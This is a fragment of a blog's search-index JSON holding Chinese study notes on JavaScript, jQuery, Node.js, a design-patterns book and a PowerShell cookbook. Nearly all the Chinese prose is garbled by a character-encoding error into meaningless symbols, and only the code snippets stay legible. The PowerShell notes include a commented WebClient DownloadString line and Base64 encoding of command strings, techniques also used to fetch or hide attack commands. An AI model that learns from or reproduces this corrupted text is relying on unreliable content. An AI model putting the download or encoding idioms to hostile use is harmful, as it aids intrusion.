Array.prototype.slice.call(arguments);„ÄÇ2.6 thisÂØπË±°Ôºå‰πüÁß∞‰ΩúÂáΩÊï∞‰∏ä‰∏ãÊñá„ÄÇ  ‰Ωú‰∏∫ÂáΩÊï∞Ë∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåthisË¢´ÁªëÂÆöÂú®ÂÖ®Â±ÄÂØπË±°‰∏ä„ÄÇ  ‰Ωú‰∏∫ÊñπÊ≥ïË∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåthisË¢´ÁªëÂÆöÂú®ÊñπÊ≥ïË¢´Ë∞ÉÁî®Êó∂ÊâÄÂú®ÁöÑÂØπË±°‰∏ä„ÄÇ  ‰Ωú‰∏∫ÊûÑÈÄ†ÂáΩÊï∞Ë∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåÈúÄÂú®Ë∞ÉÁî®ÂâçÂä†‰∏äÂÖ≥ÈîÆÂ≠ónewÔºåthisË¢´ÁªëÂÆöÂú®Êñ∞ÂàõÂª∫ÁöÑÂØπË±°‰∏ä„ÄÇ  apply()Êé•Âèó‰∏Ä‰∏™ÂèÇÊï∞Êï∞ÁªÑÔºåcall()Êé•ÂèóÂèÇÊï∞ÂàóË°®„ÄÇ2.7 Èó≠ÂåÖÊòØÂú®ÂáΩÊï∞Â£∞ÊòéÊó∂ÊâÄÂàõÂª∫ÁöÑ‰ΩúÁî®ÂüüÔºå‰ΩøÂæóÂáΩÊï∞ËÉΩÂ§üËÆøÈóÆÂπ∂Â§ÑÁêÜÂáΩÊï∞ÁöÑÂ§ñÈÉ®ÂèòÈáè„ÄÇÈó≠ÂåÖÂ∏∏Áî®Êù•Â∞Ü‰ø°ÊÅØÂ∞ÅË£ÖÊàêÁßÅÊúâÂèòÈáèÁöÑÂΩ¢Âºè„ÄÇ2.8 setTimeout()ÁöÑÂõûË∞ÉÂáΩÊï∞Âú®Êó∂Èó¥Âà∞ËææÊó∂ÊâçÊâßË°åÔºåÊîπÊàêÁ´ãÂç≥Ë∞ÉÁî®ÂáΩÊï∞Ë°®ËææÂºèËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ2.9 Ê®°ÂùóÔºö‰∏Ä‰∏™Â§ñÂõ¥ÂáΩÊï∞ÔºàIIFEÊàñËÄÖÂÖ∑ÂêçÂáΩÊï∞ÔºâËá≥Â∞ëÊâßË°å‰∏ÄÊ¨°ÔºõÂ§ñÂõ¥ÂáΩÊï∞Ëá≥Â∞ëËøîÂõû‰∏Ä‰∏™ÂÜÖÈÉ®ÂáΩÊï∞„ÄÇ3. Êï∞ÊçÆÁªìÊûÑÂèäÁõ∏ÂÖ≥Êìç‰Ωú3.1 Ê≠£ÂàôË°®ËææÂºè3.1.1 Ê≠£ÂàôË°®ËææÂºèÔºöÂ≠óÈù¢Èáèvar pattern = /test/;ÂíåÊûÑÈÄ†RegExpÂØπË±°ÁöÑÂÆû‰æãvar pattern = new RegExp(\"test\");‰ΩøÁî®pattern.test(\"xxxtest\")ÂÆûÁé∞ÂåπÈÖçÔºåËøîÂõûtrue/false„ÄÇ‰ΩøÁî®exec()ÂèÇÊï∞‰∏∫Âçï‰∏™Â≠óÁ¨¶‰∏≤ÔºåËøîÂõûÂåÖÂê´‰∫ÜÊâÄÊúâÂåπÈÖçÁöÑÊï∞ÁªÑ„ÄÇ3.1.2 Ê≠£ÂàôË°®ËææÂºè‰∏≠\\bË°®Á§∫ÂçïËØçËæπÁïå„ÄÇ^/$Ë°®Á§∫Ê≠£ÂàôË°®ËææÂºèÁöÑÈ¶ñÂ∞æ„ÄÇÂêëÂêéÂºïÁî®ÂèØ‰ª•ÂåπÈÖçÂêå‰∏ÄÂ≠óÁ¨¶‰∏≤Â∑≤ÁªèÂåπÈÖçÂ•ΩÁöÑÂÜÖÂÆπÔºå‰ΩøÁî®\\1,\\2Á≠âÊï∞Â≠óÂÆö‰πâ„ÄÇ3.1.3 Ê≠£Â∏∏ÊÉÖÂÜµ‰∏ãÊòØË¥™Â©™Ê®°ÂºèÔºå‰ºöÂ∞ΩÂèØËÉΩÂ§öÁöÑÂåπÈÖçÔºå‰ΩøÁî®.„ÄÇÂú®Ê≠£ÂàôË°®ËææÂºèÂêéÈù¢Âä†‰∏äÔºüËÆæÁΩÆ‰∏∫ÊáíÊÉ∞Ê®°ÂºèÔºå‰ºöÂ∞ΩÂèØËÉΩÂ∞ëÁöÑÂåπÈÖç„ÄÇ3.2 Êï∞ÁªÑ  xxx.forEach(function() {}); Ëø≠‰ª£Êï∞ÁªÑ  xxx.concat(xxx); ÂêàÂπ∂Êï∞ÁªÑ  join() \tÊï∞ÁªÑÂêàÂπ∂ÊàêÂ≠óÁ¨¶‰∏≤  ES6ÂºïÂÖ•mapÂíåsetunderscore.jsÂ∫ìÔºåÊèê‰æõÂáΩÊï∞ÂºèÂèòÊàêËæÖÂä©Á®ãÂ∫è4. Èù¢ÂêëÂØπË±°ÁöÑJSËâ∞Ê∑±Ôºå‰∏çÂ§™ÁêÜËß£4.1 ‰ΩøÁî®ÊôÆÈÄöÂáΩÊï∞var crazyBob = Player();Ôºå‰∏ç‰ºöÂÆû‰æãÂåñcrazyBobÔºå‰ΩøÁî®ÊûÑÈÄ†ÂáΩÊï∞var swingJay = new Player();‰ºöÂæóÂà∞‰∏Ä‰∏™ÂÆû‰æãÂåñÂØπË±°swingJay„ÄÇ4.2 ÂØπË±°ÁöÑÂéüÂûãÔºåÈªòËÆ§Â±ûÊÄßÔºöprototype„ÄÇÂÆû‰æãÂ±ûÊÄßÁöÑ‰ºòÂÖàÁ∫ßÈ´ò‰∫éÂéüÂûãÂ±ûÊÄß„ÄÇ4.3 thisÁöÑÂÄºÁî±ÂáΩÊï∞Ë∞ÉÁî®‰∏ä‰∏ãÊñá‰ª•ÂèäË∞ÉÁî®‰ΩçÁΩÆÊâÄÂÜ≥ÂÆö„ÄÇÂêå2.6  ÂÖ®Â±Ä‰∏ä‰∏ãÊñá‰∏≠ÔºåthisÂú®ÊµèËßàÂô®‰∏≠‰∏ÄËà¨Êåá‰ª£window„ÄÇ  ÂØπË±°ÊñπÊ≥ï‰∏≠ÔºåthisË¢´ËµãÂÄºÊàñÁªëÂÆöÂà∞ÂåÖÂê´ÂØπË±°‰∏ä„ÄÇ  ‰∏çÂ≠òÂú®‰∏ä‰∏ãÊñáÔºåthisË¢´ÁªëÂÆöÂà∞ÂÖ®Â±Ä‰∏ä‰∏ãÊñá„ÄÇ  thisÁî®‰∫éÊûÑÈÄ†ÂáΩÊï∞ÔºåthisÊåáÂêëË¢´ÊûÑÈÄ†ÁöÑÂØπË±°„ÄÇ4.4 Â∞ÜÂØπË±°ÂÆû‰æãÁªßÊâøÁöÑÊñπÊ≥ïÔºöChild.prototype = new Person();„ÄÇ4.5 JSÊ≤°ÊúâÁ±ªÁöÑÊ¶ÇÂøµÔºåÂè™ËÉΩÈÄöËøáÂáΩÊï∞‰ΩúÁî®ÂüüÂÆûÁé∞Á±ª‰ºº‰∫éprivate/publicËøôÁßçËÆøÈóÆ‰øÆÈ•∞Âô®ÁöÑ‰ΩúÁî®„ÄÇ  ÁâπÊùÉÊñπÊ≥ï‰ΩøÁî®this.method = function() {}Êù•Â£∞Êòé„ÄÇÂèØ‰ª•‰ªéÂ§ñÈÉ®Ë∞ÉÁî®Ôºå‰πüÂèØ‰ª•Áî±ÊàêÂëòËÆøÈóÆ„ÄÇ  ÂÖ¨ÂÖ±ÊñπÊ≥ï‰ΩøÁî®Class.prototype.method = function() {}Â£∞Êòé„ÄÇ‰ªª‰Ωï‰∫∫ÂèØ‰ª•ËØªÂèñÊàñÂÜôÂÖ•„ÄÇ  ÂÖ¨ÂÖ±Â±ûÊÄß‰ΩøÁî®this.prototypeÊù•Â£∞Êòé„ÄÇ4.6 Object.create()ÂèØ‰ª•Âú®‰∏çÁî®Ë∞ÉÁî®ÂØπË±°ÁöÑÊûÑÈÄ†ÂáΩÊï∞ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂú®Áà∂Â≠ê‰πãÈó¥ÂàõÂª∫‰ΩøÁî®newÊìç‰ΩúÁ¨¶‰∏ÄÊ†∑ÁöÑÂéüÂûãÈìæ„ÄÇ‰æãÂ¶ÇÔºöManager.prototype = Object.create(Employee.prototype);4.7 Êé•Êî∂Âô®ÂíåËÆæÁΩÆÂô® getter/setterUnderscore.js‰∏≠ÂåÖÂê´keys()/allKeys()/values()Á≠âÂäüËÉΩÂáΩÊï∞5. JavaScriptÊ®°Âºè5.1 Ê†áÂáÜÂåñÊñπÊ≥ïÂàõÂª∫Ê®°ÂùóÔºöCommonJSÈÄÇÁî®‰∫éÊúçÂä°Âô®Á´ØJSÁéØÂ¢É(Node.js)„ÄÇÂºÇÊ≠•Ê®°ÂùóÂÆö‰πâÔºåÊµèËßàÂô®‰ºòÂÖàÔºåÊîØÊåÅÂºÇÊ≠•Ë°å‰∏∫„ÄÇ5.2 Â∑•ÂéÇÊ®°Âºè ÂàõÂª∫Áõ∏‰ººÂØπË±°ÊäΩÂá∫ÈáçÂ§çÂá∫Áé∞ÁöÑÊìç‰ΩúÔºõÂÖÅËÆ∏Â∑•ÂéÇÁöÑÁî®Êà∑Âú®Êó†ÈúÄ‰∫ÜËß£ÂØπË±°ÂàõÂª∫ÂÜÖÈÉ®ÁªÜËäÇÁöÑÊÉÖÂÜµ‰∏ãÂàõÂª∫ÂØπË±°„ÄÇ5.3 mixinÊ®°ÂºèÂíåÁªßÊâøÁöÑÂå∫Âà´ÔºöÂ¶ÇÈúÄÂ§ö‰∏™ÂØπË±°Â±ÇÊ¨°‰πãÈó¥ÂÖ±‰∫´ÁöÑÂäüËÉΩÔºå‰ΩøÁî®mixinÔºõÂ¶ÇÊûúÊòØÂçïÂ±ÇÊ¨°Ôºå‰ΩøÁî®ÁªßÊâøÔºå‰∏îÁªßÊâøÁöÑÊÉÖÂÜµ‰∏ã‰øÆÊîπÂéüÂûã‰ºöÂΩ±Âìç‰ªéÂéüÂûãÁªßÊâøÁöÑ‰∏ÄÂàáÂÜÖÂÆπ„ÄÇ5.4 Ë£ÖÈ•∞Âô®Ê®°Âºè xxx.decorate('xxxx');ÂØπÁ©∫ÁôΩÂØπË±°ËøõË°å‰øÆÈ•∞‰ª•Êª°Ë∂≥‰∏çÂêåÈúÄÊ±Ç„ÄÇ7. ES6ËØ≠Ê≥ï‰∏äÁöÑÂèòÂåñ7.1 ÂºïÂÖ•Âõõ‰∏™Êñ∞ÁöÑÊï∞ÊçÆÁªìÊûÑÔºöMap, WeakMap, Set, WeakSet„ÄÇÂØπË±°ÁöÑÁº∫ÁÇπÊòØ‰∏çËÉΩ‰ΩøÁî®ÈùûÂ≠óÁ¨¶‰∏≤ÂÄº‰Ωú‰∏∫ÈîÆ„ÄÇWeakMapÁöÑÈîÆÂøÖÈ°ªÊòØÂØπË±°ÔºåÂÄºÁöÑÁ±ªÂûãÊ≤°ÊúâÈôêÂà∂Ôºå‰∏çËÉΩËø≠‰ª£ÔºåÊó†Ê≥ïÊ∏ÖÈô§„ÄÇÂºïÂÖ•Êï∞ÊçÆÁ±ªÂûãSymbolÔºåÊòØÂîØ‰∏Ä‰∏î‰∏çÂèØÂèòÁöÑÂÄºÔºåÈÄöÂ∏∏Áî®‰ΩúÂØπË±°Â±ûÊÄßÁöÑÊ†áËØÜÁ¨¶ÔºåÂèØÁúãÂÅöID„ÄÇ7.2 ...Â∞ÜÊï∞ÁªÑÂÖÉÁ¥†ÂàÜÊï£ÊàñÈõÜÂêàÂà∞ÂáΩÊï∞ÁöÑÂêÑ‰∏™ÂèÇÊï∞‰∏≠ÔºåÂ¶Çprint(a,b)ÂáΩÊï∞Ôºåprint(...[1,2]);ÔºåÁ±ª‰ºº‰∫éspread/restÔºåÂ∞ÜÂèÇÊï∞ÂàÜÊï£ÊàêÂ§ö‰∏™ÂèÇÊï∞/Â∞ÜÂ§ö‰∏™ÂèÇÊï∞ÈõÜ‰∏≠Êàê‰∏Ä‰∏™ÂèÇÊï∞„ÄÇ7.3 for‚Ä¶inÈÅçÂéÜÁ¥¢ÂºïÔºåfor‚Ä¶ofÈÅçÂéÜÊï∞ÁªÑÁöÑÂÄº„ÄÇÁÆ≠Â§¥ÂáΩÊï∞ var f1 = (x,y) =&gt; x*y;ÔºåÂè¶Â§ñÁÆ≠Â§¥ÂáΩÊï∞Ëß£ÂÜ≥‰∫ÜÁÆ≠Â§¥ÂáΩÊï∞ËåÉÂõ¥ÂÜÖÁõ¥Êé•‰ΩøÁî®‰∏ä‰∏Ä‰∏™ÂùóthisÂÄºËÄå‰∏çÈúÄË¶ÅÂçïÁã¨ËµãÂÄº„ÄÇ8. DOMÊìç‰Ωú‰∏é‰∫ã‰ª∂8.1 DOMÊòØHTMLÁöÑÁºñÁ®ãÊé•Âè£ÔºåÂÖÅËÆ∏‰ΩøÁî®JSÁ≠âËÑöÊú¨ËØ≠Ë®ÄÂØπÂÖ∂ËøõË°åÁªìÊûÑÂåñÊìç‰Ωú„ÄÇ8.2 ‰ΩøÁî®CDNÔºàcontent delivery networkÔºâÂØºÂÖ•jQueryÂ∫ì„ÄÇ$(document).ready();ÂáΩÊï∞‰ºöÂú®DOMÊñáÊ°£ÂáÜÂ§áÂ•Ω‰πãÂêéÊâßË°å„ÄÇ  $( '#username' ).addClass( 'hidden' );Ê∑ªÂä†‰∏Ä‰∏™Á±ª  $( '#username' ).removeClass( 'hidden' );Âà†Èô§‰∏Ä‰∏™Èõ∑„ÄÅÁ±ª  $( '#username' ).toggleClass( 'hidden' );ÂàáÊç¢ÂÖÉÁ¥†ÁöÑÁ±ª8.3 Â¢ûÂä†Êó∂Èó¥ÁõëÂê¨Âô®button.addEventListener(\"click\", function(){});„ÄÇÁ±ª‰ººÁöÑ‰ΩøÁî®$('button').on()ÂèØ‰ª•‰∏ÄÊ¨°ÁªëÂÆöÂ§ö‰∏™‰∫ã‰ª∂„ÄÇ9. ÊúçÂä°Âô®Á´ØJavaScript9.1 NodeÈááÁî®ÂºÇÊ≠•Â§ÑÁêÜÁöÑÊñπÂºèÔºå‰Ωú‰∏∫‰∏Ä‰∏™ÂçïÁ∫øÁ®ãËøêË°åÔºåÂÖ∂Êú¨Ë∫´ÂÜÖÈÉ®ÊòØÂ§öÁ∫øÁ®ãÁöÑ„ÄÇÊØè‰∏Ä‰∏™I/OÊìç‰ΩúÈÉΩÊúâÂõûË∞ÉÂáΩÊï∞„ÄÇ9.2 Â¶Ç‰∏ãÂÆûÁé∞‰∏Ä‰∏™ÁÆÄÂçïÁöÑNode.jsÊúçÂä°Âô®Ôºà‰ΩøÁî®requestÁöÑNode.jsÊ®°ÂùóÔºâ„ÄÇ\tvar http = require('http');\tvar server = http.createServer();\tserver.on('request', function (req, res) {\t\tres.writeHead(200, {'Content-Type': 'text/plain'});\t\tres.end('Hello Node\\n');\t});\tserver.listen(3000);9.3 ÂèØ‰ª•ÈÄöËøácurlÁü•ÂêçÊü•ÁúãÂÜÖÈÉ®‰ø°ÊÅØ„ÄÇcurl -v http://localhost:30009.4 NodeÂåÖÁÆ°ÁêÜÂô®npm(Node Package Manager)„ÄÇ  ÂàõÂª∫package.jsonÊñá‰ª∂Ôºönpm init„ÄÇ  Â∞ÜÊ®°ÂùóÁöÑ‰æùËµñÂÖ≥Á≥ªËá™Âä®Ê∑ªÂä†Âà∞package.json‰∏≠Ôºönpm install package --save„ÄÇ  ÂÖ®Â±ÄÂÆâË£Önpm install package -g/--globalÔºõÊú¨Âú∞ÂÆâË£Önpm install package /--save-devDesign Patterns: Elements of Reusable Object-Oriented SoftwareËÆæËÆ°Ê®°ÂûãÔºöÂèØÂ§çÁî®Èù¢ÂêëÂØπË±°ËΩØ‰ª∂ÁöÑÂü∫Á°ÄErich Gamma, Richard Helm, Ralph Johnson, John VlissidesÊú¨‰π¶‰ªãÁªç‰∫Ü‰ªÄ‰πàÊòØËÆæËÆ°Ê®°Âºè‰ª•ÂèäÂ¶Ç‰ΩïËÆæËÆ°Èù¢ÂêëÂØπË±°ÁöÑËΩØ‰ª∂Á≥ªÁªü„ÄÇÊ®°ÂûãÂàÜ‰∏∫3Á±ªÔºöÂàõÂª∫Âûã„ÄÅÁªìÊûÑÂûã„ÄÅË°å‰∏∫Âûã„ÄÇÊú¨‰π¶ÊääÈù¢ÂêëÂØπË±°ËΩØ‰ª∂ÁöÑËÆæËÆ°ÁªèÈ™å‰Ωú‰∏∫ËÆæËÆ°Ê®°ÂºèËÆ∞ÂΩï‰∏ãÊù•ÔºåÂëΩÂêç„ÄÅËß£Èáä„ÄÅËØÑ‰ª∑Ëøô‰∫õËÆæËÆ°Ê®°ÂºèÔºåÊñπ‰æø‰∫∫‰ª¨ÊúâÊïàÂú∞Âà©Áî®„ÄÇÁõÆÂâçÊ≤°ÊúâÈúÄË¶ÅÂºÄÂèëÂ§ßÂûãËΩØ‰ª∂ÁöÑÈúÄÊ±ÇÔºåÊöÇÊó∂‰∏çÂÅöÊ∑±ÂÖ•Á†îÁ©∂Ôºå‰ΩÜÊòØËøôÊú¨‰π¶ËøòÊòØÂæàÊúâÊÑè‰πâÁöÑ„ÄÇÈîãÂà©ÁöÑjQueryÂçï‰∏úÊûó Âº†ÊôìËè≤ È≠èÁÑ∂1. ËÆ§ËØÜjQuery1.1 JavaScriptÂ∫ìÔºöPrototype, Dojo, YUI, Ext JS, MooTools, jQuery„ÄÇ1.2 $(document).ready()Ë°®Á§∫Á≠âÂæÖÁΩëÈ°µ‰∏≠ÊâÄÊúâDOMÁªìÊûÑÁªòÂà∂ÂÆåÊØïÊâßË°å„ÄÇ1.3 jQueryÂØπË±°ÊòØÈÄöËøájQueryÂåÖË£ÖDOMÂØπË±°Âêé‰∫ßÁîüÁöÑÂØπË±°//jQueryÂØπË±°ËΩ¨ÊàêDOMÂØπË±°var $cr = $(\"#cr\");\t\t//jQueryÂØπË±°var cr = $cr[0];\t\t\t//DOMÂØπË±°var cr = $cr.get(0);\t//DOMÂØπË±°//DOMÂØπË±°ËΩ¨ÊàêjQueryÂØπË±°var cr = document.getElementById(\"cr\");\t//DOMÂØπË±°var $cr = $(cr);\t\t\t\t\t\t//jQueryÂØπË±°1.4 Ëã•jQueryÂ∫ìÂú®ÂÖ∂‰ªñÂ∫ì‰πãÂâçÂØºÂÖ•ÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ÔºõjQueryÂú®ÂÖ∂‰ªñÂ∫ì‰πãÂêéÂØºÂÖ•Ôºå‰ΩøÁî®var $j = jQuery.noConflict()ÂÆö‰πâÂø´Êç∑ÊñπÂºèÊù•‰ΩøÁî®„ÄÇ„ÄêÁ∫¢ÂÆù‰π¶„ÄëJavascriptÈ´òÁ∫ßÁ®ãÂ∫èËÆæËÆ°[America] Nicholas C.Zakas1. Âü∫Á°Ä1.1 JavascriptÁªÑÊàêÈÉ®ÂàÜÔºöÊ†∏ÂøÉ(ECMAScript)„ÄÅÊñáÊ°£ÂØπË±°Ê®°Âûã(DOM)„ÄÅÊµèËßàÂô®ÂØπË±°Ê®°Âûã(BOM)„ÄÇ  ECMAScriptÁî±ECMA-262ÂÆö‰πâÔºåÂÖ∂ÂÆø‰∏ªÁéØÂ¢ÉÂåÖÊã¨ÔºöWebÊµèËßàÂô®„ÄÅNode„ÄÅAdobe FlashÁ≠â„ÄÇÊèê‰æõÊ†∏ÂøÉËØ≠Ë®ÄÂäüËÉΩ„ÄÇ  ÊñáÊ°£ÂØπË±°Ê®°Âûã(DOM, Document Object Model)ÔºöÈíàÂØπXML‰ΩÜÁªèËøáÊâ©Â±ïÁî®‰∫éHTMLÁöÑÂ∫îÁî®Á®ãÂ∫èÁºñÁ®ãÊé•Âè£„ÄÇÊèê‰æõËÆøÈóÆÂíåÊìç‰ΩúÁΩëÈ°µÂÜÖÂÆπÁöÑÊñπÊ≥ïÂíåÊé•Âè£„ÄÇ  ÊµèËßàÂô®ÂØπË±°Ê®°Âûã(BOM, Browser Object Model)ÔºöÊéßÂà∂ÊµèËßàÂô®ÊòæÁ§∫ÁöÑÈ°µÈù¢‰ª•Â§ñÁöÑÂú∞Êñπ„ÄÇÊèê‰æõ‰∏éÊµèËßàÂô®‰∫§‰∫íÁöÑÊñπÊ≥ï‰∏éÊé•Âè£„ÄÇ1.2 &lt;script&gt;ÂÖÉÁ¥†6‰∏™Â±ûÊÄß  asyncÔºöÁ´ãÂç≥‰∏ãËΩΩËÑöÊú¨‰∏î‰∏çÂ¶®Á¢çÈ°µÈù¢ÂÖ∂‰ªñÊìç‰ΩúÔºåÂè™ÂØπÂ§ñÈÉ®ËÑöÊú¨ÊúâÊïà„ÄÇ  charsetÔºöÈÄöËøásrcÂ±ûÊÄßÊåáÂÆö‰ª£Á†ÅÁöÑÂ≠óÁ¨¶ÈõÜ„ÄÇ  deferÔºöËÑöÊú¨Âª∂ËøüÂà∞ÊñáÊ°£ÂÆåÂÖ®Ë¢´Ëß£ÊûêÂíåÊòæÁ§∫ÂêéÂÜçÊâßË°åÔºåÂè™ÂØπÂ§ñÈÉ®ËÑöÊú¨ÊúâÊïà„ÄÇ  languageÔºöÂ∫üÂºÉ  srcÔºöÂåÖÂê´Ë¶ÅÊâßË°åÁöÑ‰ª£Á†ÅÁöÑÂ§ñÈÉ®Êñá‰ª∂„ÄÇ  typeÔºölanguageÁöÑÊõø‰ª£Â±ûÊÄßÔºåË°®Á§∫ÁºñÂÜô‰ª£Á†Å‰ΩøÁî®ÁöÑËÑöÊú¨ËØ≠Ë®ÄÂÜÖÂÆπÁ±ªÂûã„ÄÇ‰∏ÄËà¨‰ΩøÁî®text/javascriptÂú®‰ΩøÁî®&lt;script&gt;ÂµåÂÖ•JS‰ª£Á†ÅÊó∂ÔºåÂÜÖÈÉ®‰∏çËÉΩÂá∫Áé∞&lt;/script&gt;Â≠óÁ¨¶ÔºåÂê¶ÂàôÊµèËßàÂô®‰ºö‰ª•‰∏∫ÊòØÁªìÊùüÊ†áÁ≠æ„ÄÇ‰ΩøÁî®Â§ñÈÉ®Êñá‰ª∂Êó∂ÔºåÂ∏¶ÊúâsrcÂ±ûÊÄßÁöÑ&lt;script&gt;ÂÖÉÁ¥†ÂÜÖ‰∏çËÉΩÊúâÈ¢ùÂ§ñÁöÑJS‰ª£Á†Å„ÄÇÂ§ñÈÉ®Êñá‰ª∂‰ΩçÁΩÆ‰∏ÄËà¨ÊîæÂú®bodyÂºÄÂ§¥ÔºåÊîæÂú®headÈáå‰ºö‰ΩøÂæóÂ§ñÈÉ®Êñá‰ª∂Âú®È°µÈù¢Ê∏≤ÊüìÂâçËøêË°åÔºåÂú®ÊîæÂú®body‰∏≠ÂàôÊòØÈ°µÈù¢Ê∏≤Êüì‰πãÂêéÂÜçËøêË°åÂ§ñÈÉ®Êñá‰ª∂„ÄÇÂΩìÁÑ∂ÔºåÂèØ‰ª•ÈÄöËøáÂ¢ûÂä†deferÂ±ûÊÄßÂÆûÁé∞ËÑöÊú¨ËøêË°åÂª∂Ëøü„ÄÇËã•‰ΩøÁî®asyncÂ±ûÊÄßÔºåÂàôÂ§ö‰∏™Â§ñÈÉ®ËÑöÊú¨ÁöÑËøêË°åÈ°∫Â∫è‰∏çËÉΩÁ°ÆÂÆö„ÄÇÂú®XHTML‰∏≠ÔºåÂèØ‰ª•‰ΩøÁî®CDATA[]ÁâáÊÆµÊù•ÂåÖË£πjs‰ª£Á†ÅÔºåÂÆûÁé∞ÂèØ‰ª•‰ΩøÁî®ÁâπÊÆäÁ¨¶Âè∑ÔºåÂ¶Ç&lt;Á≠â„ÄÇ1.3 ÊñáÊ°£Ê®°ÂºèÔºöÊ∑∑ÊùÇÊ®°Âºè„ÄÅÊ†áÂáÜÊ®°Âºè"
  },
  
  {
    "title": "powershell cookbook",
    "url": "/posts/powershell_cookbook/",
    "categories": "",
    "tags": "Security",
    "date": "2017-04-17 00:00:00 -0700",
    





    
    "snippet": "1.‰ΩøÁî®ÊåáÂçó1.1ËøêË°åËÑöÊú¨ÔºàË∞ÉÁî®Êìç‰ΩúÔºöÂëΩ‰ª§Âêç‰∏≠ÂåÖÂê´Á©∫Ê†ºÔºâ&amp; 'C:\\Program Files\\Program.exe' argumentsÂΩìÂâçÁõÆÂΩï‰∏ãÔºö.\\Program.exe arguments1.3ÈÖçÁΩÆÊñá‰ª∂Prompt()ÂáΩÊï∞1.4Â∏ÆÂä©Get-Command/Get-Help1.7ÂëΩ‰ª§ËΩ¨Âåñ‰∏∫Base64ÁºñÁ†Å$commands = '1..10' | % { \"Powershel...",
    "content": "1.‰ΩøÁî®ÊåáÂçó1.1ËøêË°åËÑöÊú¨ÔºàË∞ÉÁî®Êìç‰ΩúÔºöÂëΩ‰ª§Âêç‰∏≠ÂåÖÂê´Á©∫Ê†ºÔºâ&amp; 'C:\\Program Files\\Program.exe' argumentsÂΩìÂâçÁõÆÂΩï‰∏ãÔºö.\\Program.exe arguments1.3ÈÖçÁΩÆÊñá‰ª∂Prompt()ÂáΩÊï∞1.4Â∏ÆÂä©Get-Command/Get-Help1.7ÂëΩ‰ª§ËΩ¨Âåñ‰∏∫Base64ÁºñÁ†Å$commands = '1..10' | % { \"Powershell Rocks\" }'$bytes = [System.Text.Encoding]::Unicode.GetByte($commands)$encodedString = [Convert]::ToBase64String($bytes)2.ÁÆ°ÈÅì2.2ËøáÊª§ÂàóË°®È°πÊàñÂëΩ‰ª§ËæìÂá∫È°π//ÂàóÂá∫ÊâÄÊúâÊ≠£Âú®ËøêË°åÁöÑËøõÁ®ãÂêçÁß∞ÂåÖÂê´‚ÄúSearch‚ÄùÁöÑËøõÁ®ãGet-Process | Where-Object { $_.Name -like \"*Search*\" }2.4Â§ÑÁêÜÂàóË°®ÊàñÂëΩ‰ª§ËæìÂá∫ÁöÑÊØè‰∏ÄÈ°π//ËæìÂá∫1ÔΩû10*2Ôºå$_ÊòØËæìÂÖ•ÁöÑÂèÇÊï∞1..10 | Foreach-Object { $_ * 2 }//Ëé∑ÂæóÊñá‰ª∂ÂÜÖÂÆπ(txt,csv)Get-Content3.ÂèòÈáèÂíåÂØπË±°3.2ËÆøÈóÆÁéØÂ¢ÉÂèòÈáè//ÂàóÂá∫envÈ©±Âä®Âô®ÁöÑÊâÄÊúâÂ≠êËäÇÁÇπGet-ChildItem env:3.4‰ΩøÁî®.NETÂØπË±°//ÈùôÊÄÅÊñπÊ≥ï[ClassName]::MethodName(parameter list)\t[System.Diagnostics.Process]::GetProcessById(0)//(New-Object Net.WebClient).DownloadString(\"http://live.com\")\t3.8‰ΩøÁî®COMÂØπË±°$object = New_Object -ComObject ProgId//‰∫ÜËß£ÂØπË±°ÁöÑÊñπÊ≥ïÂíåÂ±ûÊÄß$object | Get-Member (-Static)Get-Member -InputObject $object//MSDNËé∑ÂæóËØ¶ÁªÜÊñáÊ°£3.12ÂêëÁ±ªÊ∑ªÂä†Ëá™ÂÆö‰πâÁöÑÊñπÊ≥ïÂíåÂ±ûÊÄß‰ΩøÁî®XML4.Âæ™ÁéØ‰∏éÊµÅÁ®ãÊéßÂà∂4.2ÊØîËæÉÂíåÈÄªËæëËøêÁÆóÁ¨¶„ÄÅÊù°‰ª∂ËØ≠Âè•ËøêÁÆóÁ¨¶Ôºö-eq,-ne,-ge,-gt,-like,-notlike,-is,-isnotÈÄªËæëÁ¨¶Ôºö-and,-or,-xor,-notÊù°‰ª∂ËØ≠Âè•Ôºöif,elseif,else,switchÂæ™ÁéØËØ≠Âè•Ôºöfor,foreach,while,do...while4.5Ê∑ªÂä†ÊöÇÂÅúÊàñÂª∂ËøüÊöÇÂÅúÁõ¥Âà∞enterÔºöRead-HostÊöÇÂÅúÁõ¥Âà∞Êåâ‰∏ãÊüê‰∏ÄÈîÆÔºö$host.UI.RawUI.ReadKey()5.Â≠óÁ¨¶‰∏≤‰∏éÈùûÁªìÊûÑÂåñÊñáÊú¨5.1 ÂàõÂª∫Â≠óÁ¨¶‰∏≤ÂéüÁîüÂ≠óÁ¨¶‰∏≤‰ΩøÁî®ÂçïÂºïÂè∑ÊîØÊåÅÂèòÈáèÊâ©Â±ïÂíåËΩ¨ÁßªÂ≠óÁ¨¶ÁöÑ‰ΩøÁî®ÂèåÂºïÂè∑PS &gt;\"{0} divided by {1} is {2}\" -f $number2, $number1, ($number2 / $number1)5.7Ê†πÊçÆÊñáÊú¨ÊàñÊ®°ÂºèÂú®Â≠óÁ¨¶‰∏≤‰∏≠Êü•ÊâæÂ≠óÁ¨¶‰∏≤‰∏éÈÄöÈÖçÁ¨¶ÂåπÈÖçÔºö-likeÂ≠óÁ¨¶‰∏≤‰∏éÊ≠£ÂàôË°®ËææÂºèÂåπÈÖçÔºö-matchÂ≠óÁ¨¶‰∏≤ÊòØÂê¶ÂåÖÂê´ÁâπÂÆöÂ≠óÁ¨¶‰∏≤Ôºö.Contains(\"\")    